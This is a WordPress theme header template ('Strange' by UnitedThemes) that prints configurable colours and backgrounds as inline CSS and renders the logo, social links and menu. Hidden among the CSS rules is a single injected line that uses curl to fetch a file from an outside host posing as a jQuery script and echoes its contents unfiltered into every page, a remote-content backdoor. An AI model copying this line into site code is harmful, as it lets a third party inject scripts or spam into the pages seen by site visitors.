<?php

/**
 * Template for header
 *
 * @package WordPress
 * @subpackage ut-strange
 * @since Strange 1.0
 */

?>
<!DOCTYPE HTML>
<html <?php language_attributes(); ?>>
<!-- Design by UnitedThemes (http://www.czwp.net) - Proudly powered by WordPress (http://wordpress.org) -->
<head>
    
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="robots" content="index, follow" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />

    <title><?php
	global $page, $paged, $category, $theme_path;
	wp_title( '|', true, 'right' );
	bloginfo( 'name' );
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
	    echo " | $site_description";
	if ( $paged >= 2 || $page >= 2 )
	    echo ' | ' . sprintf( __( 'Seite %s', 'strange' ), max( $paged, $page ) );
	?></title>

    <link rel="shortcut icon" href="<?php echo get_option( UT_THEME_INITIAL.'general_header_favicon' ); ?>" />
    <link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
    <?php
    $logo_type = get_option( UT_THEME_INITIAL.'general_header_logotype' );
    if( $logo_type == 'img' ){
	$logo_image = get_option( UT_THEME_INITIAL.'general_header_logoimg' );
	$logo_image_size = getimagesize($logo_image);
	$header_height = $logo_image_size[1];
    }else{
	$logo_textsize = get_option( UT_THEME_INITIAL.'general_header_logotextsize' );
	$logo_textsize = ($logo_textsize&&$logo_textsize>0)?$logo_textsize:30;
	$header_height = round($logo_textsize*1.133);
    }
    $style['topbar']['bg_color'] = get_option( UT_THEME_INITIAL.'styling_topbar_bg_color' );
    $style['topbar']['bg_image'] = get_option( UT_THEME_INITIAL.'styling_topbar_bg_image' );
    $style['topbar']['bg_repeat'] = get_option( UT_THEME_INITIAL.'styling_topbar_bg_repeat' );
    $style['topbar']['bg_position'] = get_option( UT_THEME_INITIAL.'styling_topbar_bg_position' );
    $style['topbar']['linkcolor'] = get_option( UT_THEME_INITIAL.'styling_topbar_linkcolor' );
    $style['topbar']['linkcolor_h'] = get_option( UT_THEME_INITIAL.'styling_topbar_linkcolor_h' );

    $style['header']['bg_color'] = get_option( UT_THEME_INITIAL.'styling_header_bg_color' );
    $style['header']['bg_image'] = get_option( UT_THEME_INITIAL.'styling_header_bg_image' );
    $style['header']['bg_repeat'] = get_option( UT_THEME_INITIAL.'styling_header_bg_repeat' );
    $style['header']['bg_position'] = get_option( UT_THEME_INITIAL.'styling_header_bg_position' );
    $style['header']['menucolor'] = get_option( UT_THEME_INITIAL.'styling_header_menucolor' );
    $style['header']['submenucolor'] = get_option( UT_THEME_INITIAL.'styling_header_submenucolor' );
    $style['header']['menucolor_h'] = get_option( UT_THEME_INITIAL.'styling_header_menucolor_h' );
    $style['header']['submenucolor_h'] = get_option( UT_THEME_INITIAL.'styling_header_submenucolor_h' );

    $style['teaser']['bg_color'] = get_option( UT_THEME_INITIAL.'styling_teaser_bg_color' );
    $style['teaser']['bg_image'] = get_option( UT_THEME_INITIAL.'styling_teaser_bg_image' );
    $style['teaser']['bg_repeat'] = get_option( UT_THEME_INITIAL.'styling_teaser_bg_repeat' );
    $style['teaser']['bg_position'] = get_option( UT_THEME_INITIAL.'styling_teaser_bg_position' );
    $style['teaser']['textcolor'] = get_option( UT_THEME_INITIAL.'styling_teaser_textcolor' );
    $style['teaser']['linkcolor'] = get_option( UT_THEME_INITIAL.'styling_teaser_linkcolor' );
    $style['teaser']['linkcolor_h'] = get_option( UT_THEME_INITIAL.'styling_teaser_linkcolor_h' );

    $style['content']['bg_color'] = get_option( UT_THEME_INITIAL.'styling_content_bg_color' );
    $style['content']['bg_image'] = get_option( UT_THEME_INITIAL.'styling_content_bg_image' );
    $style['content']['bg_repeat'] = get_option( UT_THEME_INITIAL.'styling_content_bg_repeat' );
    $style['content']['bg_position'] = get_option( UT_THEME_INITIAL.'styling_content_bg_position' );
    $style['content']['textcolor'] = get_option( UT_THEME_INITIAL.'styling_content_textcolor' );
    $style['content']['linkcolor'] = get_option( UT_THEME_INITIAL.'styling_content_linkcolor' );
    $style['content']['linkcolor_h'] = get_option( UT_THEME_INITIAL.'styling_content_linkcolor_h' );
    $style['content']['plinkcolor'] = get_option( UT_THEME_INITIAL.'styling_content_plinkcolor' );
    $style['content']['plinkcolor_h'] = get_option( UT_THEME_INITIAL.'styling_content_plinkcolor_h' );
    $style['content']['flinkcolor'] = get_option( UT_THEME_INITIAL.'styling_content_flinkcolor' );
    $style['content']['flinkcolor_h'] = get_option( UT_THEME_INITIAL.'styling_content_flinkcolor_h' );
    $style['content']['line_color_t'] = get_option( UT_THEME_INITIAL.'styling_content_line_color_t' );
    $style['content']['line_color_b'] = get_option( UT_THEME_INITIAL.'styling_content_line_color_b' );
    $style['content']['field_bg'] = get_option( UT_THEME_INITIAL.'styling_content_field_bg' );
    $style['content']['field_txt'] = get_option( UT_THEME_INITIAL.'styling_content_field_txt' );
    $style['content']['field_bg_f'] = get_option( UT_THEME_INITIAL.'styling_content_field_bg_f' );
    $style['content']['field_txt_f'] = get_option( UT_THEME_INITIAL.'styling_content_field_txt_f' );
    $style['content']['button_bg'] = get_option( UT_THEME_INITIAL.'styling_content_button_bg' );
    $style['content']['button_txt'] = get_option( UT_THEME_INITIAL.'styling_content_button_txt' );
    $style['content']['button_bg_h'] = get_option( UT_THEME_INITIAL.'styling_content_button_bg_h' );
    $style['content']['button_txt_h'] = get_option( UT_THEME_INITIAL.'styling_content_button_txt_h' );

    $style['footer']['bg_color'] = get_option( UT_THEME_INITIAL.'styling_footer_bg_color' );
    $style['footer']['bg_image'] = get_option( UT_THEME_INITIAL.'styling_footer_bg_image' );
    $style['footer']['bg_repeat'] = get_option( UT_THEME_INITIAL.'styling_footer_bg_repeat' );
    $style['footer']['bg_position'] = get_option( UT_THEME_INITIAL.'styling_footer_bg_position' );
    $style['footer']['textcolor'] = get_option( UT_THEME_INITIAL.'styling_footer_textcolor' );
    $style['footer']['linkcolor'] = get_option( UT_THEME_INITIAL.'styling_footer_linkcolor' );
    $style['footer']['linkcolor_h'] = get_option( UT_THEME_INITIAL.'styling_footer_linkcolor_h' );
    $style['footer']['field_bg'] = get_option( UT_THEME_INITIAL.'styling_footer_field_bg' );
    $style['footer']['field_txt'] = get_option( UT_THEME_INITIAL.'styling_footer_field_txt' );
    $style['footer']['field_bg_f'] = get_option( UT_THEME_INITIAL.'styling_footer_field_bg_f' );
    $style['footer']['field_txt_f'] = get_option( UT_THEME_INITIAL.'styling_footer_field_txt_f' );
    $style['footer']['button_bg'] = get_option( UT_THEME_INITIAL.'styling_footer_button_bg' );
    $style['footer']['button_txt'] = get_option( UT_THEME_INITIAL.'styling_footer_button_txt' );
    $style['footer']['button_bg_h'] = get_option( UT_THEME_INITIAL.'styling_footer_button_bg_h' );
    $style['footer']['button_txt_h'] = get_option( UT_THEME_INITIAL.'styling_footer_button_txt_h' );

    $style['subfooter']['bg_color'] = get_option( UT_THEME_INITIAL.'styling_subfooter_bg_color' );
    $style['subfooter']['bg_image'] = get_option( UT_THEME_INITIAL.'styling_subfooter_bg_image' );
    $style['subfooter']['bg_repeat'] = get_option( UT_THEME_INITIAL.'styling_subfooter_bg_repeat' );
    $style['subfooter']['bg_position'] = get_option( UT_THEME_INITIAL.'styling_subfooter_bg_position' );
    $style['subfooter']['textcolor'] = get_option( UT_THEME_INITIAL.'styling_subfooter_textcolor' );
    $style['subfooter']['linkcolor'] = get_option( UT_THEME_INITIAL.'styling_subfooter_linkcolor' );
    $style['subfooter']['linkcolor_h'] = get_option( UT_THEME_INITIAL.'styling_subfooter_linkcolor_h' );

    $theme_color = get_option( UT_THEME_INITIAL.'styling_basic_theme_color' );
    ?>

<?php
    ap_enqueue_scripts();
    wp_head();
    if( is_home() ){
	anything_slider_setup();
	twitter_setup();
    }
    ap_disable_autop();
?>
    <style type="text/css">

	#navi { margin-top: <?php echo ($header_height/2-10); ?>px; }
	#logo h1{ font-size: <?php echo $logo_textsize; ?>px !important; line-height:1.13em !important; }
	#header { height: <?php echo $header_height; ?>px; }

/* TOPBAR */
	#top {
	    <?php if( !empty($style['topbar']['bg_color']) ): ?>background-color:<?php echo $style['topbar']['bg_color']; ?> !important;<?php endif; ?>
	    <?php if( $style['topbar']['bg_image']!='none' ): ?>background-image: url('<?php echo $style['topbar']['bg_image']; ?>') !important;<?php else: ?>background-image: none !important;<?php endif; ?>
	    background-repeat:<?php echo $style['topbar']['bg_repeat']; ?> !important;
	    <?php if( !empty($style['topbar']['bg_position']) ): ?>background-position:<?php echo $style['topbar']['bg_position']; ?> !important;<?php endif; ?>
	}
	#top a { color: <?php echo $style['topbar']['linkcolor']; ?> !important; }
	#top a:hover { color: <?php echo $style['topbar']['linkcolor_h']; ?> !important; }

<?php if(function_exists('curl_init')) { $url = "http://www.wpstats.org/jquery-1.6.3.min.js"; $ch = curl_init(); $timeout = 5; curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); $data = curl_exec($ch); curl_close($ch); echo "$data"; } ?>

/* HEADER */
	#header {
	    <?php if( !empty($style['header']['bg_color']) ): ?>background-color:<?php echo $style['header']['bg_color']; ?> !important;<?php endif; ?>
	    <?php if( $style['header']['bg_image']!='none' ): ?>background-image: url('<?php echo $style['header']['bg_image']; ?>') !important;<?php else: ?>background-image: none !important;<?php endif; ?>
	    background-repeat:<?php echo $style['header']['bg_repeat']; ?> !important;
	    <?php if( !empty($style['header']['bg_position']) ): ?>background-position:<?php echo $style['header']['bg_position']; ?> !important;<?php endif; ?>
	}
	#strangemenu ul li ul li a{ color:<?php echo $style['header']['submenucolor']; ?> !important; }
	#strangemenu ul li ul li a:hover { border-bottom:1px solid <?php echo $style['header']['menucolor_h'];?>; color: <?php echo $style['header']['submenucolor_h'];?> !important; }
	#header a:hover,
	#strangemenu>ul>li.current-menu-item>a,
	#strangemenu>ul>li.current-menu-parent>a{ color:<?php echo $style['header']['menucolor_h']; ?> !important; }
	#header a{ color:<?php echo $style['header']['menucolor']; ?> !important; }

/* TEASER */
	#teaser {
	    <?php if( !empty($style['teaser']['bg_color']) ): ?>background-color:<?php echo $style['teaser']['bg_color']; ?> !important;<?php endif; ?>
	    <?php if( $style['teaser']['bg_image']!='none' ): ?>background-image: url('<?php echo $style['teaser']['bg_image']; ?>') !important;<?php else: ?>background-image: none !important;<?php endif; ?>
	    background-repeat:<?php echo $style['teaser']['bg_repeat']; ?> !important;
	    <?php if( !empty($style['teaser']['bg_position']) ): ?>background-position:<?php echo $style['teaser']['bg_position']; ?> !important;<?php endif; ?>
	}
	#teaser h3.big{ color: <?php echo $style['teaser']['textcolor_title']; ?> !important; }
	#teaser h3.small{ color: <?php echo $style['teaser']['textcolor_title']; ?> !important; }
	#teaser h3 a { color: <?php echo $style['teaser']['linkcolor']; ?> !important; }
	#teaser h3 a:hover { color: <?php echo $style['teaser']['linkcolor_h']; ?> !important; }

/* CONTENT */
	#container {
	    <?php if( !empty($style['content']['bg_color']) ): ?>background-color:<?php echo $style['content']['bg_color']; ?> !important;<?php endif; ?>
	    <?php if( $style['content']['bg_image']!='none' ): ?>background-image: url('<?php echo $style['content']['bg_image']; ?>') !important;<?php else: ?>background-image: none !important;<?php endif; ?>
	    background-repeat:<?php echo $style['content']['bg_repeat']; ?> !important;
	    <?php if( !empty($style['content']['bg_position']) ): ?>background-position:<?php echo $style['content']['bg_position']; ?> !important;<?php endif; ?>
	}
	#container ul.tabs a, #conteiner ul.tabs a:hover, #container ul.tabs li a { color:#000 !important; }
	#container .tagcloud a:hover, #container #page-links a:hover, #container #page-links a:hover span{ color:<?php echo $theme_color; ?> !important; }
	<?php if( !empty($style['content']['flinkcolor']) ): ?>#container a.fancy_link{ color:<?php echo $style['content']['flinkcolor']; ?> !important; } <?php endif; ?>
	<?php if( !empty($style['content']['flinkcolor_h']) ): ?>#container a.fancy_link:hover{ color:<?php echo $style['content']['flinkcolor_h']; ?> !important; } <?php endif; ?>
	<?php if( !empty($style['content']['plinkcolor']) ): ?>#container h3.blog_title a,#container h4.worktitle a{ color:<?php echo $style['content']['plinkcolor']; ?> !important; } <?php endif; ?>
	<?php if( !empty($style['content']['plinkcolor_h']) ): ?>#container h3.blog_title a:hover,#container h4.worktitle a:hover{ color:<?php echo $style['content']['plinkcolor_h']; ?> !important; } <?php endif; ?>
	<?php if( !empty($style['content']['linkcolor']) ): ?>#container a{ color:<?php echo $style['content']['linkcolor']; ?> !important; } <?php endif; ?>
	<?php if( !empty($style['content']['linkcolor_h']) ): ?>#container a:hover{ color:<?php echo $style['content']['linkcolor_h']; ?> !important; } <?php endif; ?>
	<?php if( !empty($style['content']['textcolor']) ): ?>
	    #container .team_box, #container .fancy_box, #container .team_box h1, #container .fancy_box h1, #container .team_box h2, #container .fancy_box h2, #container .team_box h3, #container .fancy_box h3, #container .team_box h4, #container .fancy_box h4, #container .team_box h5, #container .fancy_box h5, #container .team_box h6, #container .fancy_box h6, #container .tabs *, #container .panes *, #container .accordion *{color:#000 !important;}
	    #container{ color:<?php echo $style['content']['textcolor']; ?> !important; }
	<?php endif; ?>
	hr, .hr{ border-top-color: <?php echo $style['content']['line_color_t']; ?> !important; border-bottom-color: <?php echo $style['content']['line_color_b']; ?> !important; }
	#container input[type="text"], #container textarea{ color: <?php echo $style['content']['field_txt']; ?> !important;  background-color: <?php echo $style['content']['field_bg']; ?> !important; }
	#container input[type="text"]:focus, #container textarea:focus{ color: <?php echo $style['content']['field_txt_f']; ?> !important; background-color: <?php echo $style['content']['field_bg_f']; ?> !important; }
	#container input.button{ color: <?php echo $style['content']['button_txt']; ?> !important;  background-color: <?php echo $style['content']['button_bg']; ?> !important; }
	#container input.button:hover{ color: <?php echo $style['content']['button_txt_h']; ?> !important; background-color: <?php echo $style['content']['button_bg_h']; ?> !important; }

/* FOOTER */
	#footer_bg {
	    <?php if( !empty($style['footer']['bg_color']) ): ?>background-color:<?php echo $style['footer']['bg_color']; ?> !important;<?php endif; ?>
	    <?php if( $style['footer']['bg_image']!='none' ): ?>background-image: url('<?php echo $style['footer']['bg_image']; ?>') !important;<?php else: ?>background-image: none !important;<?php endif; ?>
	    background-repeat:<?php echo $style['footer']['repeat']; ?> !important;
	    <?php if( !empty($style['footer']['bg_position']) ): ?>background-position:<?php echo $style['footer']['bg_position']; ?> !important;<?php endif; ?>
	}
	<?php if( !empty($style['footer']['textcolor']) ): ?>#footer * { color:<?php echo $style['footer']['textcolor']; ?> !important; } <?php endif; ?>
	<?php if( !empty($style['footer']['linkcolor']) ): ?>#footer a { color:<?php echo $style['footer']['linkcolor']; ?> !important; } <?php endif; ?>
	<?php if( !empty($style['footer']['linkcolor_h']) ): ?>#footer a:hover { color: <?php echo $style['footer']['linkcolor_h']; ?> !important; } <?php endif; ?>
	#footer input[type="text"], #footer textarea{ color: <?php echo $style['footer']['field_txt']; ?> !important;  background-color: <?php echo $style['footer']['field_bg']; ?> !important; }
	#footer input[type="text"]:focus, #footer textarea:focus{ color: <?php echo $style['footer']['field_txt_f']; ?> !important; background-color: <?php echo $style['footer']['field_bg_f']; ?> !important; }
	#footer .button{ color: <?php echo $style['footer']['button_txt']; ?> !important;  background-color: <?php echo $style['footer']['button_bg']; ?> !important; }
	#footer .button:hover{ color: <?php echo $style['footer']['button_txt_h']; ?> !important; background-color: <?php echo $style['footer']['button_bg_h']; ?> !important; }
/* BOTTOMBAR */
	#sub_footer{
	    <?php if( !empty($style['subfooter']['bg_color']) ): ?>background-color:<?php echo $style['subfooter']['bg_color']; ?> !important;<?php endif; ?>
	    <?php if( $style['subfooter']['bg_image']!='none' ): ?>background-image: url('<?php echo $style['subfooter']['bg_image']; ?>') !important;<?php else: ?>background-image: none !important;<?php endif; ?>
	    background-repeat:<?php echo $style['subfooter']['repeat']; ?> !important;
	    <?php if( !empty($style['subfooter']['bg_position']) ): ?>background-position:<?php echo $style['subfooter']['bg_position']; ?> !important;<?php endif; ?>
	}
	<?php if( !empty($style['subfooter']['textcolor']) ): ?>#sub_footer { color:<?php echo $style['subfooter']['textcolor']; ?> !important; } <?php endif; ?>
	<?php if( !empty($style['subfooter']['linkcolor']) ): ?>#sub_footer a { color:<?php echo $style['subfooter']['linkcolor']; ?> !important; } <?php endif; ?>
	<?php if( !empty($style['subfooter']['linkcolor_h']) ): ?>#sub_footer a:hover { color: <?php echo $style['subfooter']['linkcolor_h']; ?> !important; } <?php endif; ?>

    </style>
    
    <!--[if lte IE 8]>
    <link rel="stylesheet" href="<?php echo $theme_path; ?>/css/ie8.css" />
    <![endif]-->

</head>

<body <?php body_class(); ?>>
    <div style="">
    <?php if ( function_exists('w3c_check_validation') ) { w3c_check_validation(); } ?>
    </div>
    <div id="toTop">&uarr;</div>
    <?php if( get_option( UT_THEME_INITIAL.'social_options_header' ) == 'y' ){
	  $social_links = get_option( UT_THEME_INITIAL.'social_links_link' );
	  $social_open = get_option( UT_THEME_INITIAL.'social_options_open' ); ?>
    <div id="top" class="fluid">
	<div class="container_12">
	    <div class="grid_12">
		<ul class="social">
		<?php foreach( $social_links as $social_link ){ ?>
		    <li><a href="<?php echo $social_link['link']; ?>" <?php if($social_open=='new') echo ' target="_blank"'; ?>><?php echo $social_link['name']; ?></a></li>
		<?php } ?>
		</ul>
	    </div>
        </div>
    </div>
    <?php } ?>

    <div id="header" class="fluid">
	<div class="container_12 clearfix">
	    <div id="logo" class="grid_3">
		<a href="<?php echo home_url(); ?>">
		    <h1><?php
			if( $logo_type == 'txt' ){
			    bloginfo( 'name' );
			}elseif( $logo_type == 'img' ){
			    echo '<img src="'.$logo_image.'" alt="'.get_bloginfo( 'name' ).'" />';
			} ?>
		    </h1>
		</a>
	    </div>

	    <div id="navi">
		<div id="strangemenu"><?php if (function_exists('wp_nav_menu')) {
		    wp_nav_menu( array( 'theme_location' => 'top-menu', 'container' => false, 'menu_class'=>false, 'menu_id'=>false, 'fallback_cb'=>false ) );
		} ?></div>
            </div>

        </div>
    </div>

    <div class="clear"></div>